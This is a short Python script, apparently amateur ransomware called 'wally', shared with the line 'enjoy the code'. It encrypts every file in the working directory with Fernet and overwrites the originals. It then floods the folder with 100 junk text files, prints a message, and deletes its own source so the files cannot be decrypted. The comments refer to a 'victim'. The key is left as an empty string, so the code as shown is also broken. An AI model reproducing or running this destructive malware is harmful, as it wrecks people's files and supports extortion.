# soo enjoy the code ...
import os
from cryptography.fernet import Fernet
import random

def wally()-> None:
    files = []
    for file in os.listdir():
        files.append(file)
    # "This is used to append all the file into files list."

    key = ""
    # "You want to enter a key to encrypt all the file and you make a key by using key.py . "
    # "You must enter the key if you can't enter it show error"

    for i in files:
        with open(i,'rb')as f:
            data = f.read()
        enc_data = Fernet(key).encrypt(data)
        # "This is used to open file and encrypt all the file with the help of the key. "
        with open(i,'wb')as f:
            all_file = f.write(enc_data)
        # "This will regenerate all the file and add encrypt file. "
    g=['o', 's', 'd', 'a', 'f', 'j', 'i', 'o', 'w', 'f', 'j', 'i', 'q', 'w', 'j', 'i', 'j', 'M', 'M', 'V', 
     'A', 'I', 'O', 'F', 'O', 'I', 'A', 'O', 'J', 'G', 'A', 'J', 'M', 'X', 'J', 'K', 'V', 'J', '0', '9', '8', '7', '6', 
     '5', '4', '3', '2', '1', 'j', 'i', 'j', 'w', 'i', 'o', 'f', 'j', 'w', 'j', 'f', 's', 'l', 'f', 'a', 'o', 'j', 'f', 
     'o', 'q', 'i', 'u', 'p', '@', '#', '$', '%', '^', '&', '*', '(', ')', ')', '_', ')', '(', '*', '&', '^', '%', '$', '#', ')']
    # "This is a random words to make false files that buffer the system . "

    for _ in range (100):
        # "Here you also increase the random files i am takin 100 . "
        a = random.randint(2344,9999)    # "Taking random number for false file name. "
        with open(f"{a}.txt","w")as f:       # "Opening the files. "
            lo=[]
            for i in range(68):
                b=random.choice(g)
                lo.append(b)
            result = ''.join(map(str,lo))
            f.write(result)                     # "So all the false file is creating"
        print("Happy Wally")
    print("")                                     # "Enter Something for victim"
    return os.remove("wally.py")                  # "Now no one can decrypt this this because the source code is gone"
            

    